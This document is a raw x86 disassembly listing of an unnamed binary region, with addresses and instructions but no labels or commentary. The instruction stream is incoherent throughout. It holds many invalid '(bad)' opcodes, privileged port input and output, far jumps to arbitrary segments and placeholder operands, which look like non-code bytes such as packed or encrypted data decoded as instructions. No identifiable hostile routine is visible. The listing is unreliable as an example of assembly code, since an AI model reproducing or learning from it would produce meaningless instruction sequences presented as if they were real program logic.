  4216a1:	xlat   BYTE PTR ds:[ebx]
  4216a2:	adc    eax,0x2c0d096f
  4216a7:	sub    dh,ch
  4216a9:	pop    ss
  4216aa:	lods   ax,WORD PTR ds:[esi]
  4216ac:	jo     0x421727
  4216ae:	pop    esp
  4216af:	inc    ebx
  4216b0:	xchg   edi,eax
  4216b1:	out    dx,eax
  4216b2:	(bad)  
  4216b3:	std    
  4216b4:	daa    
  4216b5:	adc    bh,BYTE PTR [ebx]
  4216b7:	cli    
  4216b8:	sub    al,0x6b
  4216ba:	fdivr  QWORD PTR [eax-0x75]
  4216bd:	cdq    
  4216be:	mov    al,ds:0x5b20c671
  4216c3:	psadbw mm7,QWORD PTR ds:[ebp-0x3f]
  4216c8:	pop    ds
  4216c9:	lahf   
  4216ca:	or     eax,0xeae3aa90
  4216cf:	sahf   
  4216d0:	retf   
  4216d1:	mov    edx,0x943b5cb0
  4216d6:	pcmpeqd mm5,QWORD PTR [ecx+0x3de5fbe0]
  4216dd:	sub    esp,ebp
  4216df:	push   cs
  4216e0:	mov    cl,0xe9
  4216e2:	dec    edx
  4216e3:	dec    ebp
  4216e4:	pop    eax
  4216e5:	out    0xac,eax
  4216e7:	jp     0x4216b8
  4216e9:	push   eax
  4216ea:	add    esp,esp
  4216ec:	inc    BYTE PTR [edx+eiz*4]
  4216ef:	jg     0x4216f1
	...
  4216f9:	add    BYTE PTR [eax],ah
  4216fb:	push   ss
  4216fc:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4216fd:	lea    esi,[esi+0x44bf29bf]
  421703:	sub    esp,esi
  421705:	neg    dl
  421707:	ds loopne 0x421719
  42170a:	clc    
  42170b:	xchg   edx,eax
  42170c:	add    DWORD PTR [eax],eax
  42170e:	inc    BYTE PTR [ecx]
  421710:	add    BYTE PTR [eax],al
  421712:	jo     0x4216a4
  421714:	test   al,0x5e
  421716:	repnz dec BYTE PTR [ecx]
  421719:	std    
  42171a:	jmp    0x4216e2
  42171c:	mov    ebp,0xca710318
  421721:	(bad)  
  421722:	adc    BYTE PTR [edx],al
  421724:	sbb    ah,BYTE PTR [eax+0x1ea96fad]
  42172a:	(bad)  [ecx-0x6e]
  42172d:	cli    
  42172e:	sbb    bl,BYTE PTR [edi]
  421730:	sbb    BYTE PTR [eax],0xa6
  421733:	ins    DWORD PTR es:[edi],dx
  421734:	add    al,0x9c
  421736:	cli    
  421737:	or     eax,0x9ad751dc
  42173c:	out    0x89,eax
  42173e:	xor    BYTE PTR ds:0xb3739b04,cl
  421744:	mov    ch,0xcc
  421746:	mov    edi,0xc71fb1f9
  42174b:	xchg   ebx,eax
  42174c:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42174d:	fild   QWORD PTR [ecx-0x79]
  421750:	or     ah,ah
  421752:	dec    edi
  421753:	xchg   DWORD PTR [esi-0x5ed088d2],esp
  421759:	bound  ebx,QWORD PTR [eax-0x2d32646f]
  42175f:	pop    esp
  421760:	xor    ebp,edi
  421762:	or     ebx,ebx
  421764:	mov    dl,0x10
  421766:	push   es
  421767:	mov    ?,WORD PTR [eax+0x2e6a0b5a]
  42176d:	mov    ah,0xef
  42176f:	or     al,0xdd
  421771:	(bad)  
  421772:	mov    ebx,ecx
  421774:	popa   
  421775:	arpl   bx,dx
  421777:	mov    bl,0xf4
  421779:	push   edi
  42177a:	xchg   esp,eax
  42177b:	pop    es
  42177c:	rcl    DWORD PTR [ebx],0x17
  42177f:	(bad)  
  421780:	into   
  421781:	dec    ebx
  421782:	mov    ss,WORD PTR [ecx-0x140d7188]
  421788:	cs inc ecx
  42178a:	fidivr DWORD PTR [ebx]
  42178c:	sbb    cl,BYTE PTR es:[edi-0x2911a0ca]
  421793:	imul   ebp,DWORD PTR cs:[ebp-0x56],0xd24a9e44
  42179b:	repnz fstp TBYTE PTR [ebx]
  42179e:	sahf   
  42179f:	les    ebp,FWORD PTR [ebp+0xe35f9c7]
  4217a5:	pop    ebx
  4217a6:	fnstcw WORD PTR [edi]
  4217a8:	push   DWORD PTR [eax]
  4217aa:	nop
  4217ab:	mov    WORD PTR [ebp-0x79],?
  4217ae:	adc    BYTE PTR [ebx-0x8be9530],0x85
  4217b5:	je     0x421760
  4217b7:	cmp    al,ch
  4217b9:	int    0x97
  4217bb:	lods   eax,DWORD PTR ds:[esi]
  4217bc:	mov    cl,0xcd
  4217be:	mov    bh,0xdc
  4217c0:	or     BYTE PTR [edx+eax*1],bh
  4217c3:	mov    edx,DWORD PTR [eax]
  4217c5:	cmp    eax,0x582d137c
  4217ca:	stos   BYTE PTR es:[edi],al
  4217cb:	jnp    0x421775
  4217cd:	lds    ebp,FWORD PTR [edi]
  4217cf:	popf   
  4217d0:	sub    DWORD PTR [esi+0xa1c0d78],esi
  4217d6:	push   ebx
  4217d7:	sub    DWORD PTR [eax],edi
  4217d9:	sub    eax,0xd8c0c4da
  4217de:	xchg   esp,eax
  4217df:	retf   0x88ed
  4217e2:	stos   BYTE PTR es:[edi],al
  4217e3:	xchg   ebx,eax
  4217e4:	sbb    eax,0xd24cb774
  4217e9:	dec    ebp
  4217ea:	lods   al,BYTE PTR ds:[esi]
  4217eb:	inc    esp
  4217ec:	push   0xd1e2dcaa
  4217f1:	repnz test BYTE PTR [edi+0x56ba1a00],dl
  4217f8:	dec    ebp
  4217f9:	jge    0x421835
  4217fb:	fs mov ebx,ebp
  4217fe:	sub    al,0x53
  421800:	mov    eax,0x867bb0dc
  421805:	loope  0x42185e
  421807:	iret   
  421808:	inc    esp
  421809:	sub    eax,0x1b88e5c5
  42180e:	mov    esp,0x4790b1b7
  421813:	xchg   edi,eax
  421814:	and    al,0xe1
  421816:	mov    esi,0x386f5f77
  42181b:	inc    ecx
  42181c:	out    dx,eax
  42181d:	jmp    0x42186f
  42181f:	sbb    ebx,DWORD PTR [eax]
  421821:	out    0xc,al
  421823:	adc    eax,0xf4207c3d
  421828:	adc    al,0xa2
  42182a:	and    al,0x3e
  42182c:	shr    DWORD PTR [edx],0x87
  42182f:	mov    bh,0x46
  421831:	shl    BYTE PTR ds:0xb91f41a,1
  421837:	xchg   esp,eax
  421838:	push   esp
  421839:	dec    ecx
  42183a:	icebp  
  42183b:	push   es
  42183c:	enter  0x17fe,0x6d
  421840:	fsubr  DWORD PTR [edi]
  421842:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  421843:	jne    0x42185d
  421845:	xchg   dh,bh
  421847:	bound  ecx,QWORD PTR [edi-0x34]
  42184a:	jl     0x42183e
  42184c:	xor    ebx,ecx
  42184e:	test   eax,0xca4d9329
  421853:	(bad)  
  421854:	(bad)  
  421855:	push   cs
  421856:	push   0x86637cca
  42185b:	sbb    al,dh
  42185d:	sub    ch,BYTE PTR ds:0xa13d2485
  421863:	call   FWORD PTR [edi]
  421865:	icebp  
  421866:	mov    bl,BYTE PTR [esi-0x1e3a061c]
  42186c:	and    BYTE PTR [edx],dh
  42186e:	rol    ebx,0xfe
  421871:	cmp    BYTE PTR [esi+0x35],dl
  421874:	(bad)  
  421876:	push   ebp
  421877:	or     bl,bl
  421879:	cmc    
  42187a:	dec    eax
  42187b:	ret    
  42187c:	jecxz  0x42185e
  42187e:	dec    ebx
  42187f:	push   es
  421880:	pop    ecx
  421881:	mov    DWORD PTR [eax],ebx
  421883:	xor    ebx,DWORD PTR [ebx]
  421885:	scas   eax,DWORD PTR es:[edi]
  421886:	aam    0x55
  421888:	fist   DWORD PTR [edx-0xc17e042]
  42188e:	add    BYTE PTR [edx+0x5a79f00f],0xba
  421895:	clc    
  421896:	jg     0x42187d
  421898:	pusha  
  421899:	ins    BYTE PTR es:[edi],dx
  42189a:	add    al,0x38
  42189c:	xchg   edi,eax
  42189d:	xchg   ecx,eax
  42189e:	loope  0x42190b
  4218a0:	jmp    0x4153:0x5c818f6
  4218a7:	dec    ebx
  4218a8:	bound  eax,QWORD PTR [ecx-0x5f]
  4218ab:	repz jmp 0x9ae1:0x590399b6
  4218b3:	pop    es
  4218b4:	lock cmps BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4218b6:	js     0x4218ab
  4218b8:	push   esi
  4218b9:	add    dl,BYTE PTR [ecx+0x4228a45]
  4218bf:	sub    BYTE PTR [edx-0x29896ec0],ch
  4218c5:	cmp    eax,0x51924012
  4218ca:	arpl   WORD PTR [esi-0x60],sp
  4218cd:	jge    0x42190f
  4218cf:	cmp    al,0x7
  4218d1:	loope  0x421951
  4218d3:	test   BYTE PTR [ebx+0x71f4224c],cl
  4218d9:	pop    ebp
  4218da:	and    al,0x65
  4218dc:	(bad)  
  4218dd:	jne    0x42195b
  4218df:	scas   al,BYTE PTR es:[edi]
  4218e0:	fcom   QWORD PTR [ebp+0x393f4d30]
  4218e6:	idiv   DWORD PTR [edx+0x1e]
  4218e9:	push   eax
  4218ea:	dec    edx
  4218eb:	mov    dh,0xb8
  4218ed:	cmp    eax,0x5f56346c
  4218f2:	repnz inc eax
  4218f4:	mov    al,ds:0x1b721270
  4218f9:	hlt    
  4218fa:	and    al,0xc6
  4218fc:	(bad)  
  4218fd:	xchg   esp,eax
  4218fe:	push   eax
  4218ff:	jge    0x4218cd
  421901:	ret    0xbc39
  421904:	gs xor eax,0x32793910
  42190a:	sub    DWORD PTR [ebp+0x78],esi
  42190d:	inc    ecx
  42190e:	mov    bh,0x87
	...
  421918:	add    BYTE PTR [eax],al
  42191a:	mov    al,0x33
  42191c:	cmp    ch,BYTE PTR [ecx+0x3bb3a9bb]
  421922:	pop    DWORD PTR [edx-0x44]
  421925:	mov    bh,BYTE PTR [ebx]
  421927:	in     eax,dx
  421928:	rcr    DWORD PTR [edx+0x194f6],cl
  42192e:	inc    BYTE PTR [ecx]
  421930:	add    BYTE PTR [eax],al
  421932:	lods   eax,DWORD PTR ds:[esi]
  421933:	add    eax,0x2dffc30b
  421938:	xor    BYTE PTR [edi-0x4f],ah
  42193b:	inc    edi
  42193c:	sbb    DWORD PTR [edx+edi*2-0x59d2af12],ebp
  421943:	arpl   WORD PTR [ecx-0x3703cce9],dx
  421949:	sub    al,0x5d
  42194b:	pusha  
  42194c:	fnstsw WORD PTR [ebx+0x444dedb7]
  421952:	icebp  
  421953:	push   0xffffffb1
  421955:	pop    ecx
  421956:	js     0x42192f
  421958:	das    
  421959:	or     al,0xc7
  42195b:	cmp    cl,BYTE PTR ds:0xc0ac8633
  421961:	mov    edx,0xeec9ab57
  421966:	and    al,0x8d
  421968:	or     DWORD PTR [esi+0x1d6d94bb],0x860799f9
  421972:	push   ds
  421973:	fldcw  WORD PTR [edi+ebx*2]
  421976:	sbb    ch,ch
  421978:	ret    
  421979:	dec    ecx
  42197a:	mov    fs,esi
  42197c:	jl     0x4219ca
  42197e:	jl     0x4219b4
  421980:	rcl    edi,cl
  421982:	ins    BYTE PTR es:[edi],dx
  421983:	pusha  
  421984:	xchg   edx,eax
  421985:	ret    
  421986:	xor    bl,bl
  421988:	(bad)  
  42198a:	imul   edi,DWORD PTR [esi+0x67dc74c6],0x2b
  421991:	sbb    al,0x89
  421993:	push   ebp
  421994:	ret    
  421995:	mov    esi,0xed050060
  42199a:	add    edx,ebp
  42199c:	cmpps  xmm3,XMMWORD PTR ds:0x6b6ac2ca,0xbd
  4219a4:	mov    dh,BYTE PTR ds:0xc67ba040
  4219aa:	fwait
  4219ab:	mov    dh,0x31
  4219ad:	aaa    
  4219ae:	aam    0x7c
  4219b0:	and    DWORD PTR [ebp-0x420e72cc],ebp
  4219b6:	push   0x32
  4219b8:	pop    ebx
  4219b9:	mov    ecx,0x46076c36
  4219be:	in     al,dx
  4219bf:	xor    cl,bh
  4219c1:	sub    DWORD PTR [edi],esp
  4219c3:	lds    esp,FWORD PTR [ecx+0x3]
  4219c6:	or     edx,DWORD PTR [esi+0x64fc6b5b]
  4219cc:	inc    ecx
  4219cd:	and    edx,DWORD PTR [ecx+0x57]
  4219d0:	std    
  4219d1:	outs   dx,DWORD PTR ds:[esi]
  4219d2:	mov    eax,ds:0x4ca6f8b6
  4219d7:	xor    eax,DWORD PTR [eax+eiz*8+0x3e95e218]
  4219de:	mov    fs,WORD PTR [edx+0x7a]
  4219e1:	aad    0x1e
  4219e3:	imul   ebx,DWORD PTR [edx+0x1837e36],0xacf73c31
  4219ed:	sbb    eax,0x570a2b29
  4219f2:	loope  0x4219f0
  4219f4:	xchg   ebx,eax
  4219f5:	sbb    ch,BYTE PTR [edi-0x17]
  4219f8:	je     0x421a66
  4219fa:	test   eax,0xc661862
  4219ff:	scas   eax,DWORD PTR es:[edi]
  421a00:	mov    bh,0x36
  421a02:	sar    DWORD PTR [eax],1
  421a04:	test   ebx,eax
  421a06:	sbb    DWORD PTR [esi],edi
  421a08:	jns    0x4219fa
  421a0a:	adc    al,bh
  421a0c:	dec    eax
  421a0d:	cs das 
  421a0f:	retf   0xd4e2
  421a12:	mov    cl,bl
  421a14:	or     eax,0xccf8e0ec
  421a19:	xlat   BYTE PTR ds:[ebx]
  421a1a:	jle    0x421a1b
  421a1c:	xor    ch,BYTE PTR [esi+0x6c]
  421a1f:	fnstcw WORD PTR [edx]
  421a21:	push   ds
  421a22:	push   ebp
  421a23:	jmp    0x1ad6:0xc27cb5aa
  421a2a:	and    eax,0xc774da83
  421a2f:	inc    edx
  421a30:	adc    DWORD PTR [ebx-0x53d434a2],ecx
  421a36:	mov    DWORD PTR [eax],esi
  421a38:	push   0x60
  421a3a:	mov    dh,0x8e
  421a3c:	movzx  edx,BYTE PTR [esi-0x220962c7]
  421a43:	(bad)  
  421a44:	in     al,0xf9
  421a46:	sbb    dl,dh
  421a48:	dec    ebx
  421a49:	les    ebx,FWORD PTR [edi]
  421a4b:	mov    eax,0xf6ffeaee
  421a50:	sti    
  421a51:	jo     0x421a20
  421a53:	fsub   DWORD PTR [eax-0x6462711d]
  421a59:	mov    ecx,0xda49c78b
  421a5e:	les    edi,FWORD PTR [esi-0x5747d895]
  421a64:	test   BYTE PTR [ecx+ebp*8-0x7],bl
  421a68:	gs dec ebp
  421a6a:	cmp    ecx,DWORD PTR [eax+ebx*4+0x5b]
  421a6e:	inc    esp
  421a6f:	mov    eax,0x7ead0a01
  421a74:	lock mov eax,ds:0x24f1247d
  421a7a:	stos   BYTE PTR es:[edi],al
  421a7b:	adc    dh,dl
  421a7d:	and    eax,0xcb311ce1
  421a82:	retf   
  421a83:	sub    eax,0xd0c26213
  421a88:	xchg   esi,eax
  421a89:	cmp    ebp,0x54
  421a8c:	add    ebx,DWORD PTR [edi+0x257e65d7]
  421a92:	dec    eax
  421a93:	leave  
  421a94:	or     al,dh
  421a96:	xor    al,0xa4
  421a98:	jno    0x421a50
  421a9a:	push   eax
  421a9b:	mov    eax,ds:0x3b0efa99
  421aa0:	pusha  
  421aa1:	or     esi,edi
  421aa3:	xchg   BYTE PTR [edi*8-0x5167344c],dh
  421aaa:	call   0xa379:0xf3541d87
  421ab1:	test   al,0x5c
  421ab3:	int    0x93
  421ab5:	scas   eax,DWORD PTR es:[edi]
  421ab6:	sbb    DWORD PTR [edx-0x724ad681],edi
  421abc:	mov    DWORD PTR [ebx+0x2a],esp
  421abf:	or     ah,BYTE PTR [ebx]
  421ac1:	pop    edx
  421ac2:	inc    ebx
  421ac3:	mov    al,0xde
  421ac5:	push   esp
  421ac6:	out    dx,eax
  421ac7:	shl    esp,cl
  421ac9:	inc    ecx
  421aca:	rcl    BYTE PTR [eax-0x2235919],1
  421ad0:	shl    BYTE PTR [edx+0x23],0x14
  421ad4:	outs   dx,BYTE PTR ds:[esi]
  421ad5:	fiadd  DWORD PTR [edx+0x4e617b7c]
  421adb:	imul   eax,DWORD PTR [ebx],0x3a
  421ade:	jae    0x421a99
  421ae0:	push   ebp
  421ae1:	je     0x421a72
  421ae3:	push   es
  421ae4:	jp     0x421b21
  421ae6:	jl     0x421b1b
  421ae8:	fdivr  st(4),st
  421aea:	call   0xab00:0x6f74f123
  421af1:	and    DWORD PTR [ebx-0x1d],ebp
  421af4:	outs   dx,DWORD PTR ds:[esi]
  421af5:	inc    eax
  421af6:	pop    ecx
  421af7:	fisubr DWORD PTR [edx+0x2a198250]
  421afd:	std    
  421afe:	xor    dh,BYTE PTR [ecx]
  421b00:	mov    ah,0xf
  421b02:	hlt    
  421b03:	cmp    ecx,ebx
  421b05:	and    eax,0x941a37f8
  421b0a:	aas    
  421b0b:	xor    DWORD PTR [eax+0x3d1e8913],ecx
  421b11:	frstor [edi-0x44fda3ae]
  421b17:	pop    edx
  421b18:	jo     0x421b38
  421b1a:	and    bh,dh
  421b1c:	aad    0xf9
  421b1e:	pop    ebp
  421b1f:	test   al,0xbc
  421b21:	pop    ebx
  421b22:	dec    esp
  421b23:	sbb    ebx,DWORD PTR [ebx+0x7b0e6448]
  421b29:	add    al,0x5b
  421b2b:	lods   al,BYTE PTR ds:[esi]
  421b2c:	dec    ebx
  421b2d:	ror    DWORD PTR [ebx+edx*1+0x0],1
	...
  421b39:	add    BYTE PTR [ecx-0x6b36a2],ch
  421b3f:	xchg   edi,eax
  421b40:	std    
  421b41:	jg     0x421b32
  421b43:	mov    edi,0x25f5f8f7
  421b48:	shr    DWORD PTR [ecx+0x196f4],0xfe
  421b4f:	add    DWORD PTR [eax],eax
  421b51:	add    BYTE PTR [ebp-0x12],dl
  421b54:	dec    edx
  421b55:	shr    DWORD PTR [ebx+0x42],cl
  421b58:	(bad)  
  421b59:	ds out dx,al
  421b5b:	ss dec esp
  421b5d:	pop    esi
  421b5e:	push   edi
  421b5f:	in     eax,0x37
  421b61:	popf   
  421b62:	dec    edi
  421b63:	scas   eax,DWORD PTR es:[edi]
  421b64:	add    al,0xce
  421b66:	mov    esp,0xad76f930
  421b6b:	xchg   ecx,eax
  421b6c:	add    eax,DWORD PTR ds:0xb4f41b1a
  421b72:	mov    al,BYTE PTR [esi+0x6c592152]
  421b78:	jmp    0x421b23
  421b7a:	mov    ds:0x52789331,eax
  421b7f:	cmp    edi,ebp
  421b81:	inc    ecx
  421b82:	jmp    0x1dcb:0x828a0f72
  421b89:	cwde   
  421b8a:	mov    dl,0x5e
  421b8c:	and    bh,BYTE PTR [ecx]
  421b8e:	cs inc ecx
  421b90:	sbb    eax,0x35fb5004
  421b95:	test   eax,0xfd600340
  421b9a:	das    
  421b9b:	push   ebp
  421b9c:	sub    al,cl
  421b9e:	(bad)  
  421b9f:	jbe    0x421bb9
  421ba1:	mov    edx,0xf1b913fc
  421ba6:	mov    dl,0x3f
  421ba8:	xor    eax,0x95415593
  421bad:	jo     0x421c00
  421baf:	cmp    dh,BYTE PTR [edx+edx*4-0x10]
  421bb3:	jg     0x421b81
  421bb5:	jno    0x421b5b
  421bb7:	call   0x31d:0xc4014379
  421bbe:	and    eax,0xe268cb3d
  421bc3:	sbb    dl,BYTE PTR [eax+eax*4+0x66d95120]
  421bca:	lods   al,BYTE PTR ds:[esi]
  421bcb:	mov    ds:0x6a82785b,eax
  421bd0:	gs mov ebp,0x5799fe32
  421bd6:	cli    
  421bd7:	dec    edi
  421bd8:	xor    eax,0x7d04a046
  421bdd:	jmp    0x3891:0x88921fb0
  421be4:	jbe    0x421c0b
  421be6:	or     ebp,esi
  421be8:	mov    ch,0x10
  421bea:	adc    DWORD PTR [edi-0x5731ba75],esp
  421bf0:	sub    cl,bl
  421bf2:	jg     0x421c36
  421bf4:	aad    0xab
  421bf6:	and    eax,0x30a8b9e8
  421bfb:	retf   
  421bfc:	into   
  421bfd:	pop    ss
  421bfe:	pop    esi
  421bff:	jne    0x421baa
  421c01:	add    al,0x72
  421c03:	fist   WORD PTR [ebp+0x45]
  421c06:	dec    ebp
  421c07:	mov    esi,0x64d64f4e
  421c0c:	xor    al,BYTE PTR [edi-0x79]
  421c0f:	jbe    0x421be2
  421c11:	jne    0x421c5e
  421c13:	fimul  WORD PTR [eax]
  421c15:	jb     0x421c22
  421c17:	and    BYTE PTR [ecx-0xd702f25],ch
  421c1d:	mov    esi,0xa6c3edb0
  421c22:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  421c23:	pinsrw mm5,WORD PTR [ebx],0x39
  421c27:	repnz repnz xor BYTE PTR [ecx+0x150658d1],bl
  421c2f:	jne    0x421c13
  421c31:	sar    DWORD PTR ds:0x1cfad093,cl
  421c37:	repnz jecxz 0x421c27
  421c3a:	inc    edi
  421c3b:	dec    ebp
  421c3c:	dec    edi
  421c3d:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  421c3e:	push   esi
  421c3f:	call   0x3570:0x84a357e1
  421c46:	or     DWORD PTR [eax-0x79f4ace8],ebx
  421c4c:	mov    bl,0x4e
  421c4e:	adc    al,0x63
  421c50:	and    esi,DWORD PTR [esi]
  421c52:	loop   0x421cb0
  421c54:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  421c55:	mov    ebx,0x1a35d292
  421c5a:	hlt    
  421c5b:	lock ret 0x2faa
  421c5f:	addr16 jmp 0x421c83
  421c62:	xchg   esi,eax
  421c63:	push   edi
  421c64:	shl    BYTE PTR [ebx+ebp*1],0xb5
  421c68:	xor    eax,0xba1d0bb8
  421c6d:	mov    ds,WORD PTR [ecx+0x57]
  421c70:	idiv   BYTE PTR [ebp-0x5e]
  421c73:	mov    eax,0xf9d189b7
  421c78:	pop    ebp
  421c79:	and    BYTE PTR [ecx+ecx*1+0x35441d31],ah
  421c80:	sub    al,0xe2
  421c82:	fsubr  QWORD PTR [edi+0x37]
  421c85:	shl    DWORD PTR [ebp+0x2],0x50
  421c89:	sti    
  421c8a:	mov    dl,0x46
  421c8c:	(bad)
  421c8f:	cdq    
  421c90:	jns    0x421c66
  421c92:	add    BYTE PTR [esi-0x54533955],0xdc
  421c99:	int    0xc4
  421c9b:	retf   0x5a18
  421c9e:	sbb    ch,BYTE PTR [ebx+edi*8-0x4]
  421ca2:	mov    esp,0x44b6c227
  421ca7:	or     BYTE PTR [edx+0x2a],bh
  421caa:	jmp    0x421ca6
  421cac:	rcr    DWORD PTR [ecx-0x6a],1
  421caf:	or     bh,ch
  421cb1:	bound  esp,QWORD PTR [ebx-0x522b0355]
  421cb7:	ret    0xd1d7
  421cba:	sub    eax,0xc49da462
  421cbf:	call   0x926b:0xaba7ffa7
  421cc6:	bound  esi,QWORD PTR [edx]
  421cc8:	test   al,0x24
  421cca:	pushf  
  421ccb:	pop    esp
  421ccc:	sub    eax,0xc75801e4
  421cd1:	jle    0x421cce
  421cd3:	jl     0x421cfc
  421cd5:	in     eax,0xe4
  421cd7:	aaa    
  421cd8:	mov    ds,edi
  421cda:	sub    eax,DWORD PTR [edx+0x18]
  421cdd:	test   edx,edx
  421cdf:	dec    esi
  421ce0:	cs inc eax
  421ce2:	jns    0x421c8b
  421ce4:	dec    edx
  421ce5:	jl     0x421d10
  421ce7:	div    ch
  421ce9:	adc    DWORD PTR [edx+0x6f8fc7a2],0x7a
  421cf0:	mov    ch,0x96
  421cf2:	jmp    0x78484adf
  421cf7:	xchg   edx,eax
  421cf8:	pusha  
  421cf9:	mov    cl,0xa0
  421cfb:	aas    
  421cfc:	pop    ss
  421cfd:	dec    ecx
  421cfe:	cmp    eax,0x7146aebf
  421d03:	call   0xa4c6b647
  421d08:	jp     0x421d48
  421d0a:	hlt    
  421d0b:	pop    ebx
  421d0c:	inc    esp
  421d0d:	cdq    
  421d0e:	(bad)  
  421d0f:	imul   eax,DWORD PTR [ebx],0x27
  421d12:	cmp    al,0x94
  421d14:	dec    ecx
  421d15:	xchg   ebp,edi
  421d17:	ins    BYTE PTR es:[edi],dx
  421d18:	xchg   ebp,eax
  421d19:	imul   esp,DWORD PTR [edx-0x1067158f],0xbf8f5552
  421d23:	gs dec esp
  421d25:	mov    BYTE PTR [ecx+0x12],ah
  421d28:	add    BYTE PTR [edi+0x3397cf5],ch
  421d2e:	mov    ah,bh
  421d30:	and    eax,0x1a027287
  421d35:	jns    0x421cfc
  421d37:	jmp    0x2e39d629
  421d3c:	js     0x421db0
  421d3e:	fsub   st,st(3)
  421d40:	and    bl,BYTE PTR [ecx+0x1ca4e4f0]
  421d46:	bnd jle 0x421cd8
  421d49:	push   es
  421d4a:	jb     0x421d00
  421d4c:	mul    dl
  421d4e:	pop    ebp
  421d4f:	push   0x0
  421d54:	add    BYTE PTR [eax],al
  421d56:	add    BYTE PTR [eax],al
  421d58:	add    BYTE PTR [eax],al
  421d5a:	mov    ebx,0x7d7539cf
  421d5f:	idiv   edi
  421d61:	iret   
  421d62:	(bad)  
  421d63:	ror    DWORD PTR [ebp+0x6d],1
  421d66:	jno    0x421d2e
  421d68:	out    dx,al
  421d69:	jg     0x421d5d
  421d6b:	cwde   
  421d6c:	add    DWORD PTR [eax],eax
  421d6e:	inc    BYTE PTR [ecx]
  421d70:	add    BYTE PTR [eax],al
  421d72:	jnp    0x421de2
  421d74:	and    al,0xca
  421d76:	sub    eax,0xf69d28da
  421d7b:	lds    esi,FWORD PTR [ecx+0x75a08842]
  421d81:	test   DWORD PTR [edi],esi
  421d83:	daa    
  421d84:	and    ch,BYTE PTR [edx+eax*8]
  421d87:	out    dx,eax
  421d88:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  421d89:	push   edx
  421d8a:	lods   eax,DWORD PTR ds:[esi]
  421d8b:	ror    dl,0x22
  421d8e:	inc    eax
  421d8f:	cmp    cl,BYTE PTR [esi]
  421d91:	mov    eax,ds:0x18481617
  421d96:	fwait
  421d97:	ins    DWORD PTR es:[edi],dx
  421d98:	pusha  
  421d99:	(bad)  
  421d9a:	outs   dx,DWORD PTR ds:[esi]
  421d9b:	inc    ebp
  421d9c:	(bad)  
  421d9d:	iret   
  421d9e:	jo     0x421df6
  421da0:	daa    
  421da1:	sahf   
  421da2:	mov    ds:0xe59a7b0f,eax
  421da7:	and    eax,0x80a52941
  421dac:	es call 0x556d6676
  421db2:	jo     0x421df3
  421db4:	outs   dx,BYTE PTR ds:[esi]
  421db5:	repnz push cs
  421db7:	xchg   BYTE PTR [esi],al
  421db9:	fwait
  421dba:	and    bh,bh
  421dbc:	sbb    edx,DWORD PTR [ecx-0x55]
  421dbf:	add    edx,DWORD PTR [ebx]
  421dc1:	adc    eax,0xed081235
  421dc6:	call   0xb852:0xa529a10f
  421dcd:	jge    0x421d80
  421dcf:	(bad)  
  421dd0:	pusha  
  421dd1:	xor    al,0xdb
  421dd3:	pop    ebp
  421dd4:	popf   
  421dd5:	loope  0x421db8
  421dd7:	add    al,0x5f
  421dd9:	mov    dh,0xce
  421ddb:	ja     0x421e56
  421ddd:	ins    BYTE PTR es:[edi],dx
  421dde:	cmp    eax,0x64d69d0c
  421de3:	fwait
  421de4:	jno    0x421df4
  421de6:	shr    DWORD PTR ds:0x55d4b738,0x6d
  421ded:	pusha  
  421dee:	int3   
  421def:	or     al,BYTE PTR [ecx]
  421df1:	fist   DWORD PTR [edx+0x25]
  421df4:	sbb    eax,0x4e6b8e10
  421df9:	in     al,dx
  421dfa:	dec    ebp
  421dfb:	loop   0x421dca
  421dfd:	pop    esp
  421dfe:	push   esp
  421dff:	inc    esi
  421e00:	sub    eax,0xd61de55d
  421e05:	sbb    DWORD PTR [edx+0x7b],eax
  421e08:	fldcw  WORD PTR [esi-0xa59a4c8]
  421e0e:	(bad)  
  421e0f:	into   
  421e10:	sar    BYTE PTR [ecx+0x15],1
  421e13:	out    dx,al
  421e14:	stos   DWORD PTR es:[edi],eax
  421e15:	jmp    0x4598:0x73ef665d
  421e1c:	cmp    BYTE PTR ds:0x58b7b0f3,al
  421e22:	sbb    al,0x8b
  421e24:	nop
  421e25:	scas   al,BYTE PTR es:[edi]
  421e26:	ror    ch,1
  421e28:	rol    edi,1
  421e2a:	sbb    DWORD PTR [ebx-0xe3dc72],eax
  421e30:	xor    BYTE PTR [ebp-0x5998eace],al
  421e36:	int    0x14
  421e38:	out    0x22,al
  421e3a:	jle    0x421e44
  421e3c:	aaa    
  421e3d:	inc    edi
  421e3e:	retf   0x7865
  421e41:	rol    eax,cl
  421e43:	(bad)  
  421e45:	add    edi,edi
  421e47:	or     ebx,DWORD PTR [esp+eax*1-0x47]
  421e4b:	pusha  
  421e4c:	pushf  
  421e4d:	and    ecx,0x25
  421e50:	rcl    BYTE PTR [esi],cl
  421e52:	pop    ds
  421e53:	sti    
  421e54:	inc    ebx
  421e55:	enter  0x9eb6,0x14
  421e59:	or     al,0x4a
  421e5b:	mov    edx,?
  421e5d:	push   edx
  421e5e:	xchg   esp,eax
  421e5f:	mov    WORD PTR [eax-0x6ee316f9],?
  421e65:	sahf   
  421e66:	pop    esi
  421e67:	lea    edi,[esi+0x29786869]
  421e6d:	pop    ss
  421e6e:	push   esi
  421e6f:	rcl    DWORD PTR [eax-0x2e49794a],0xb9
  421e76:	fidivr DWORD PTR [esi]
  421e78:	gs sub edi,eax
  421e7b:	pop    eax
  421e7c:	loope  0x421e94
  421e7e:	jb     0x421ee6
  421e80:	mov    ah,BYTE PTR [ebp-0xc]
  421e83:	into   
  421e84:	bound  eax,QWORD PTR [edx]
  421e86:	mov    ecx,0xeaacbfb1
  421e8b:	dec    edx
  421e8c:	scas   al,BYTE PTR es:[edi]
  421e8d:	push   0x6f
  421e8f:	inc    edx
  421e90:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  421e91:	lea    edi,[ecx+0x16cc459f]
  421e97:	leave  
  421e98:	jo     0x421e75
  421e9a:	mov    ecx,0xd7584fac
  421e9f:	ins    DWORD PTR es:[edi],dx
  421ea0:	aad    0xe2
  421ea2:	mov    ebp,ecx
  421ea4:	int3   
  421ea5:	push   esi
  421ea6:	push   ebp
  421ea7:	leave  
  421ea8:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  421ea9:	in     al,0x56
